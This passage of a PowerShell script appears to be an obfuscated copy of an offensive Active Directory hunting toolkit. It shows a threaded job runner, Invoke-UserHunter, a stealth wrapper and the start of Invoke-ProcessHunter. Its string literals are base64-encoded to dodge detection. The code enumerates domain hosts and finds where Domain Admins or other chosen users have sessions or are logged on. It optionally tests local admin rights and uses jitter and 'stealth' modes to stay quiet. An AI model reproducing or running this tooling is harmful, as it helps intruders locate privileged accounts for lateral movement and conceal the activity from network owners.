            $VorbiddenVars = @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Pw=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YXJncw=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29uc29sZUZpbGVOYW1l"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXJyb3I="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXhlY3V0aW9uQ29udGV4dA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZmFsc2U="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SE9NRQ=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SG9zdA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aW5wdXQ="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SW5wdXRPYmplY3Q="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWF4aW11bUFsaWFzQ291bnQ="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWF4aW11bURyaXZlQ291bnQ="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWF4aW11bUVycm9yQ291bnQ="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWF4aW11bUZ1bmN0aW9uQ291bnQ="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWF4aW11bUhpc3RvcnlDb3VudA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWF4aW11bVZhcmlhYmxlQ291bnQ="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TXlJbnZvY2F0aW9u"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bnVsbA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UElE"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UFNCb3VuZFBhcmFtZXRlcnM="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UFNDb21tYW5kUGF0aA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UFNDdWx0dXJl"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UFNEZWZhdWx0UGFyYW1ldGVyVmFsdWVz"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UFNIT01F"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UFNTY3JpcHRSb290"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UFNVSUN1bHR1cmU="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UFNWZXJzaW9uVGFibGU="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UFdE"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2hlbGxJZA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3luY2hyb25pemVkSGFzaA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("dHJ1ZQ=="))))

            
            ForEach($Var in $MyVars) {
                if($VorbiddenVars -NotContains $Var.Name) {
                $SessionState.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
                }
            }

            
            ForEach($Function in (Get-ChildItem Function:)) {
                $SessionState.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $Function.Name, $Function.Definition))
            }
        }

        
        
        

        
        $Pool = [runspacefactory]::CreateRunspacePool(1, $Threads, $SessionState, $Host)
        $Pool.Open()

        $Jobs = @()
        $PS = @()
        $Wait = @()

        $Counter = 0
    }

    process {

        ForEach ($Computer in $ComputerName) {

            
            if ($Computer -ne '') {
                

                While ($($Pool.GetAvailableRunspaces()) -le 0) {
                    Start-Sleep -MilliSeconds 500
                }

                
                $PS += [powershell]::create()

                $PS[$Counter].runspacepool = $Pool

                
                $Null = $PS[$Counter].AddScript($ScriptBlock).AddParameter(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))), $Computer)
                if($ScriptParameters) {
                    ForEach ($Param in $ScriptParameters.GetEnumerator()) {
                        $Null = $PS[$Counter].AddParameter($Param.Name, $Param.Value)
                    }
                }

                
                $Jobs += $PS[$Counter].BeginInvoke();

                
                $Wait += $Jobs[$Counter].AsyncWaitHandle
            }
            $Counter = $Counter + 1
        }
    }

    end {

        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2FpdGluZyBmb3Igc2Nhbm5pbmcgdGhyZWFkcyB0byBmaW5pc2guLi4=")))

        $WaitTimeout = Get-Date

        
        while ($($Jobs | Where-Object {$_.IsCompleted -eq $False}).count -gt 0 -or $($($(Get-Date) - $WaitTimeout).totalSeconds) -gt 60) {
                Start-Sleep -MilliSeconds 500
            }

        
        for ($y = 0; $y -lt $Counter; $y++) {

            try {
                
                $PS[$y].EndInvoke($Jobs[$y])

            } catch {
                Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXJyb3I6IHswfQ=="))) -f $_)
            }
            finally {
                $PS[$y].Dispose()
            }
        }
        
        $Pool.Dispose()
        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWxsIHRocmVhZHMgY29tcGxldGVkIQ==")))
    }
}


function Invoke-UserHunter {


    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $ComputerName,

        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,

        [String]
        $ComputerFilter,

        [String]
        $ComputerADSpath,

        [Switch]
        $Unconstrained,

        [String]
        $GroupName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWluIEFkbWlucw=="))),

        [String]
        $TargetServer,

        [String]
        $UserName,

        [String]
        $UserFilter,

        [String]
        $UserADSpath,

        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $UserFile,

        [Switch]
        $AdminCount,

        [Switch]
        $AllowDelegation,

        [Switch]
        $CheckAccess,

        [Switch]
        $StopOnSuccess,

        [Switch]
        $NoPing,

        [UInt32]
        $Delay = 0,

        [Double]
        $Jitter = .3,

        [String]
        $Domain,

        [String]
        $DomainController,

        [Switch]
        $ShowAll,

        [Switch]
        $SearchForest,

        [Switch]
        $Stealth,

        [String]
        [ValidateSet("DFS","DC","File","All")]
        $StealthSource =([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWxs"))),

        [Switch]
        $ForeignUsers,

        [ValidateRange(1,100)] 
        [Int]
        $Threads
    )

    begin {

        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVidWc=")))]) {
            $DebugPreference = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29udGludWU=")))
        }

        
        $RandNo = New-Object System.Random

        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WypdIFJ1bm5pbmcgSW52b2tlLVVzZXJIdW50ZXIgd2l0aCBkZWxheSBvZiAkRGVsYXk=")))

        if($Domain) {
            $TargetDomains = @($Domain)
        }
        elseif($SearchForest) {
            
            $TargetDomains = Get-NetForestDomain | ForEach-Object { $_.Name }
        }
        else {
            
            $TargetDomains = @( (Get-NetDomain).name )
        }

        
        
        
        
        

        if(!$ComputerName) { 
            [Array]$ComputerName = @()
            
            if($ComputerFile) {
                
                $ComputerName = Get-Content -Path $ComputerFile
            }
            elseif($Stealth) {
                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3RlYWx0aCBtb2RlISBFbnVtZXJhdGluZyBjb21tb25seSB1c2VkIHNlcnZlcnM=")))
                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3RlYWx0aCBzb3VyY2U6ICRTdGVhbHRoU291cmNl")))

                ForEach ($Domain in $TargetDomains) {
                    if (($StealthSource -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RmlsZQ==")))) -or ($StealthSource -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWxs"))))) {
                        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WypdIFF1ZXJ5aW5nIGRvbWFpbiAkRG9tYWluIGZvciBGaWxlIFNlcnZlcnMuLi4=")))
                        $ComputerName += Get-NetFileServer -Domain $Domain -DomainController $DomainController
                    }
                    if (($StealthSource -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REZT")))) -or ($StealthSource -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWxs"))))) {
                        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WypdIFF1ZXJ5aW5nIGRvbWFpbiAkRG9tYWluIGZvciBERlMgU2VydmVycy4uLg==")))
                        $ComputerName += Get-DFSshare -Domain $Domain -DomainController $DomainController | ForEach-Object {$_.RemoteServerName}
                    }
                    if (($StealthSource -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM=")))) -or ($StealthSource -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWxs"))))) {
                        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WypdIFF1ZXJ5aW5nIGRvbWFpbiAkRG9tYWluIGZvciBEb21haW4gQ29udHJvbGxlcnMuLi4=")))
                        $ComputerName += Get-NetDomainController -LDAP -Domain $Domain -DomainController $DomainController | ForEach-Object { $_.dnshostname}
                    }
                }
            }
            else {
                ForEach ($Domain in $TargetDomains) {
                    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WypdIFF1ZXJ5aW5nIGRvbWFpbiAkRG9tYWluIGZvciBob3N0cw==")))

                    $Arguments = @{
                        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu"))) = $Domain
                        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWluQ29udHJvbGxlcg=="))) = $DomainController
                        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QURTcGF0aA=="))) = $ADSpath
                        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RmlsdGVy"))) = $ComputerFilter
                        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VW5jb25zdHJhaW5lZA=="))) = $Unconstrained
                    }

                    $ComputerName += Get-NetComputer @Arguments
                }
            }

            
            $ComputerName = $ComputerName | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }
            if($($ComputerName.Count) -eq 0) {
                throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tm8gaG9zdHMgZm91bmQh")))
            }
        }

        
        
        
        
        

        
        $TargetUsers = @()

        
        $CurrentUser = ([Environment]::UserName).toLower()

        
        if($ShowAll -or $ForeignUsers) {
            $User = New-Object PSObject
            $User | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWVtYmVyRG9tYWlu"))) $Null
            $User | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWVtYmVyTmFtZQ=="))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Kg==")))
            $TargetUsers = @($User)

            if($ForeignUsers) {
                
                $krbtgtName = Convert-CanonicaltoNT4 -ObjectName (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("a3JidGd0QHswfQ=="))) -f $($Domain))
                $DomainShortName = $krbtgtName.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))))[0]
            }
        }
        
        elseif($TargetServer) {
            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UXVlcnlpbmcgdGFyZ2V0IHNlcnZlciAnJFRhcmdldFNlcnZlcicgZm9yIGxvY2FsIHVzZXJz")))
            $TargetUsers = Get-NetLocalGroup $TargetServer -Recurse | Where-Object {(-not $_.IsGroup) -and $_.IsDomain } | ForEach-Object {
                $User = New-Object PSObject
                $User | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWVtYmVyRG9tYWlu"))) ($_.AccountName).split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lw=="))))[0].toLower() 
                $User | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWVtYmVyTmFtZQ=="))) ($_.AccountName).split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lw=="))))[1].toLower() 
                $User
            }  | Where-Object {$_}
        }
        
        elseif($UserName) {
            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WypdIFVzaW5nIHRhcmdldCB1c2VyICckVXNlck5hbWUnLi4u")))
            $User = New-Object PSObject
            $User | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWVtYmVyRG9tYWlu"))) $TargetDomains[0]
            $User | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWVtYmVyTmFtZQ=="))) $UserName.ToLower()
            $TargetUsers = @($User)
        }
        
        elseif($UserFile) {
            $TargetUsers = Get-Content -Path $UserFile | ForEach-Object {
                $User = New-Object PSObject
                $User | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWVtYmVyRG9tYWlu"))) $TargetDomains[0]
                $User | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWVtYmVyTmFtZQ=="))) $_
                $User
            }  | Where-Object {$_}
        }
        elseif($UserADSpath -or $UserFilter -or $AdminCount) {
            ForEach ($Domain in $TargetDomains) {

                $Arguments = @{
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu"))) = $Domain
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWluQ29udHJvbGxlcg=="))) = $DomainController
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QURTcGF0aA=="))) = $UserADSpath
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RmlsdGVy"))) = $UserFilter
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWRtaW5Db3VudA=="))) = $AdminCount
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWxsb3dEZWxlZ2F0aW9u"))) = $AllowDelegation
                }

                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WypdIFF1ZXJ5aW5nIGRvbWFpbiAkRG9tYWluIGZvciB1c2Vycw==")))
                $TargetUsers += Get-NetUser @Arguments | ForEach-Object {
                    $User = New-Object PSObject
                    $User | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWVtYmVyRG9tYWlu"))) $Domain
                    $User | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWVtYmVyTmFtZQ=="))) $_.samaccountname
                    $User
                }  | Where-Object {$_}

            }            
        }
        else {
            ForEach ($Domain in $TargetDomains) {
                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WypdIFF1ZXJ5aW5nIGRvbWFpbiAkRG9tYWluIGZvciB1c2VycyBvZiBncm91cCAnJEdyb3VwTmFtZQ==")))
                $TargetUsers += Get-NetGroupMember -GroupName $GroupName -Domain $Domain -DomainController $DomainController
            }
        }

        if (( (-not $ShowAll) -and (-not $ForeignUsers) ) -and ((!$TargetUsers) -or ($TargetUsers.Count -eq 0))) {
            throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WyFdIE5vIHVzZXJzIGZvdW5kIHRvIHNlYXJjaCBmb3Ih")))
        }

        
        $HostEnumBlock = {
            param($ComputerName, $Ping, $TargetUsers, $CurrentUser, $Stealth, $DomainShortName)

            
            $Up = $True
            if($Ping) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
            }
            if($Up) {
                if(!$DomainShortName) {
                    
                    $Sessions = Get-NetSession -ComputerName $ComputerName
                    ForEach ($Session in $Sessions) {
                        $UserName = $Session.sesi10_username
                        $CName = $Session.sesi10_cname

                        if($CName -and $CName.StartsWith(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFw="))))) {
                            $CName = $CName.TrimStart(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))))
                        }

                        
                        if (($UserName) -and ($UserName.trim() -ne '') -and (!($UserName -match $CurrentUser))) {

                            $TargetUsers | Where-Object {$UserName -like $_.MemberName} | ForEach-Object {

                                $IP = Get-IPAddress -ComputerName $ComputerName
                                $FoundUser = New-Object PSObject
                                $FoundUser | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckRvbWFpbg=="))) $_.MemberDomain
                                $FoundUser | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlck5hbWU="))) $UserName
                                $FoundUser | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) $ComputerName
                                $FoundUser | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SVA="))) $IP
                                $FoundUser | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2Vzc2lvbkZyb20="))) $CName

                                
                                if ($CheckAccess) {
                                    $Admin = Invoke-CheckLocalAdminAccess -ComputerName $CName
                                    $FoundUser | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TG9jYWxBZG1pbg=="))) $Admin
                                }
                                else {
                                    $FoundUser | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TG9jYWxBZG1pbg=="))) $Null
                                }
                                $FoundUser
                            }
                        }                                    
                    }
                }
                if(!$Stealth) {
                    
                    $LoggedOn = Get-NetLoggedon -ComputerName $ComputerName
                    ForEach ($User in $LoggedOn) {
                        $UserName = $User.wkui1_username
                        
                        
                        $UserDomain = $User.wkui1_logon_domain

                        
                        if (($UserName) -and ($UserName.trim() -ne '')) {

                            $TargetUsers | Where-Object {$UserName -like $_.MemberName} | ForEach-Object {

                                $Proceed = $True
                                if($DomainShortName) {
                                    if ($DomainShortName.ToLower() -ne $UserDomain.ToLower()) {
                                        $Proceed = $True
                                    }
                                    else {
                                        $Proceed = $False
                                    }
                                }
                                if($Proceed) {
                                    $IP = Get-IPAddress -ComputerName $ComputerName
                                    $FoundUser = New-Object PSObject
                                    $FoundUser | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckRvbWFpbg=="))) $UserDomain
                                    $FoundUser | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlck5hbWU="))) $UserName
                                    $FoundUser | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) $ComputerName
                                    $FoundUser | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SVA="))) $IP
                                    $FoundUser | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2Vzc2lvbkZyb20="))) $Null

                                    
                                    if ($CheckAccess) {
                                        $Admin = Invoke-CheckLocalAdminAccess -ComputerName $ComputerName
                                        $FoundUser | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TG9jYWxBZG1pbg=="))) $Admin
                                    }
                                    else {
                                        $FoundUser | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TG9jYWxBZG1pbg=="))) $Null
                                    }
                                    $FoundUser
                                }
                            }
                        }
                    }
                }
            }
        }

    }

    process {

        if($Threads) {
            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNpbmcgdGhyZWFkaW5nIHdpdGggdGhyZWFkcyA9ICRUaHJlYWRz")))

            
            $ScriptParams = @{
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UGluZw=="))) = $(-not $NoPing)
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGFyZ2V0VXNlcnM="))) = $TargetUsers
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3VycmVudFVzZXI="))) = $CurrentUser
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3RlYWx0aA=="))) = $Stealth
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWluU2hvcnROYW1l"))) = $DomainShortName
            }

            
            Invoke-ThreadedFunction -ComputerName $ComputerName -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams
        }

        else {
            if(-not $NoPing -and ($ComputerName.count -ne 1)) {
                
                $Ping = {param($ComputerName) if(Test-Connection -ComputerName $ComputerName -Count 1 -Quiet -ErrorAction Stop){$ComputerName}}
                $ComputerName = Invoke-ThreadedFunction -NoImports -ComputerName $ComputerName -ScriptBlock $Ping -Threads 100
            }

            Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WypdIFRvdGFsIG51bWJlciBvZiBhY3RpdmUgaG9zdHM6IHswfQ=="))) -f $($ComputerName.count))
            $Counter = 0

            ForEach ($Computer in $ComputerName) {

                $Counter = $Counter + 1

                
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WypdIEVudW1lcmF0aW5nIHNlcnZlciAkQ29tcHV0ZXIgKCRDb3VudGVyIG9mIHswfSk="))) -f $($ComputerName.count))
                $Result = Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $Computer, $False, $TargetUsers, $CurrentUser, $Stealth, $DomainShortName
                $Result

                if($Result -and $StopOnSuccess) {
                    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WypdIFRhcmdldCB1c2VyIGZvdW5kLCByZXR1cm5pbmcgZWFybHk=")))
                    return
                }
            }
        }

    }
}


function Invoke-StealthUserHunter {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $ComputerName,

        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,

        [String]
        $ComputerFilter,

        [String]
        $ComputerADSpath,

        [String]
        $GroupName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWluIEFkbWlucw=="))),

        [String]
        $TargetServer,

        [String]
        $UserName,

        [String]
        $UserFilter,

        [String]
        $UserADSpath,

        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $UserFile,

        [Switch]
        $CheckAccess,

        [Switch]
        $StopOnSuccess,

        [Switch]
        $NoPing,

        [UInt32]
        $Delay = 0,

        [Double]
        $Jitter = .3,

        [String]
        $Domain,

        [Switch]
        $ShowAll,

        [Switch]
        $SearchForest,

        [String]
        [ValidateSet("DFS","DC","File","All")]
        $StealthSource =([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWxs")))
    )
    
    Invoke-UserHunter -Stealth @PSBoundParameters
}


function Invoke-ProcessHunter {


    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $ComputerName,

        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,

        [String]
        $ComputerFilter,

        [String]
        $ComputerADSpath,

        [String]
        $ProcessName,

        [String]
        $GroupName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWluIEFkbWlucw=="))),

        [String]
        $TargetServer,

        [String]
        $UserName,

        [String]
        $UserFilter,

        [String]
        $UserADSpath,

        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $UserFile,

        [String]
        $RemoteUserName,

        [String]
        $RemotePassword,

        [Switch]
        $StopOnSuccess,

        [Switch]
        $NoPing,

        [UInt32]
        $Delay = 0,

        [Double]
        $Jitter = .3,

        [String]
        $Domain,

        [String]
        $DomainController,

        [Switch]
        $ShowAll,

        [Switch]
        $SearchForest,

        [ValidateRange(1,100)] 
        [Int]
        $Threads
    )

    begin {

        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVidWc=")))]) {
            $DebugPreference = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29udGludWU=")))
        }

        
        $RandNo = New-Object System.Random

        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WypdIFJ1bm5pbmcgSW52b2tlLVByb2Nlc3NIdW50ZXIgd2l0aCBkZWxheSBvZiAkRGVsYXk=")))

        if($Domain) {
            $TargetDomains = @($Domain)
        }
        elseif($SearchForest) {
            
            $TargetDomains = Get-NetForestDomain | ForEach-Object { $_.Name }
        }
        else {
            
            $TargetDomains = @( (Get-NetDomain).name )
        }

        
        
        
        
        

        if(!$ComputerName) { 
            
            if($ComputerFile) {
                $ComputerName = Get-Content -Path $ComputerFile
            }
            else {
                [array]$ComputerName = @()
                ForEach ($Domain in $TargetDomains) {
                    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WypdIFF1ZXJ5aW5nIGRvbWFpbiAkRG9tYWluIGZvciBob3N0cw==")))
                    $ComputerName += Get-NetComputer -Domain $Domain -DomainController $DomainController -Filter $ComputerFilter -ADSpath $ComputerADSpath
                }
            }

            
            $ComputerName = $ComputerName | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }
            if($($ComputerName.Count) -eq 0) {
                throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tm8gaG9zdHMgZm91bmQh")))
            }
        }

        
        
        
        
        

        if(!$ProcessName) {
            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tm8gcHJvY2VzcyBuYW1lIHNwZWNpZmllZCwgYnVpbGRpbmcgYSB0YXJnZXQgdXNlciBzZXQ=")))

            
            $TargetUsers = @()

            
            if($TargetServer) {
                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UXVlcnlpbmcgdGFyZ2V0IHNlcnZlciAnJFRhcmdldFNlcnZlcicgZm9yIGxvY2FsIHVzZXJz")))
                $TargetUsers = Get-NetLocalGroup $TargetServer -Recurse | Where-Object {(-not $_.IsGroup) -and $_.IsDomain } | ForEach-Object {
                    ($_.AccountName).split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lw=="))))[1].toLower()
                }  | Where-Object {$_}
            }
            
            elseif($UserName) {
                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WypdIFVzaW5nIHRhcmdldCB1c2VyICckVXNlck5hbWUnLi4u")))
                $TargetUsers = @( $UserName.ToLower() )
            }
            
            elseif($UserFile) {
                $TargetUsers = Get-Content -Path $UserFile | Where-Object {$_}
            }
            elseif($UserADSpath -or $UserFilter) {
                ForEach ($Domain in $TargetDomains) {
                    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WypdIFF1ZXJ5aW5nIGRvbWFpbiAkRG9tYWluIGZvciB1c2Vycw==")))
                    $TargetUsers += Get-NetUser -Domain $Domain -DomainController $DomainController -ADSpath $UserADSpath -Filter $UserFilter | ForEach-Object {
                        $_.samaccountname
                    }  | Where-Object {$_}
                }            
            }
            else {
                ForEach ($Domain in $TargetDomains) {
                    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WypdIFF1ZXJ5aW5nIGRvbWFpbiAkRG9tYWluIGZvciB1c2VycyBvZiBncm91cCAnJEdyb3VwTmFtZQ==")))
                    $TargetUsers += Get-NetGroupMember -GroupName $GroupName -Domain $Domain -DomainController $DomainController| Foreach-Object {
                        $_.MemberName
                    }
                }
            }

            if ((-not $ShowAll) -and ((!$TargetUsers) -or ($TargetUsers.Count -eq 0))) {
                throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WyFdIE5vIHVzZXJzIGZvdW5kIHRvIHNlYXJjaCBmb3Ih")))
            }
        }

        
        $HostEnumBlock = {
            param($ComputerName, $Ping, $ProcessName, $TargetUsers, $RemoteUserName, $RemotePassword)

            
            $Up = $True
            if($Ping) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
            }
            if($Up) {
                
                
                if($RemoteUserName -and $RemotePassword) {
                    $Processes = Get-NetProcess -RemoteUserName $RemoteUserName -RemotePassword $RemotePassword -ComputerName $ComputerName -ErrorAction SilentlyContinue
                }
                else {
